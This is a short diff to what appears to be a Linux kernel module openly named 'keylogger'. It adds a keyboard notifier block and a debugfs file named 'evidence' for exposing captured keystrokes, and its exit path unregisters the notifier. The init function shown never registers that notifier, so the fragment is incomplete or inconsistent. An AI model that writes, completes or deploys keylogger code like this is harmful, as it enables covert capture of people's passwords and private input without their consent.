@@ -50,15 +50,25 @@ static const char *keymap[][2] = {
 };
 
 
+const struct file_operations fops = {
+    .owner = THIS_MODULE,
+};
 
-static int keylogger_init(void) {
-    printk("Hello\n");
+static struct notifier_block nb = {
+    .notifier_call = cb,
+};
+
+static int keylogger_init(void)
+{
+    file = debugfs_create_file("evidence", 0400, NULL, NULL, &fops);
+    if (!file)
+        return -ENOENT;
     return 0;
 }
 
 static void keylogger_exit(void) {
-    printk("Bye\n");
-    return;
+    unregister_keyboard_notifier(&nb);
+    debugfs_remove(file);
 }
 
 module_init(keylogger_init);
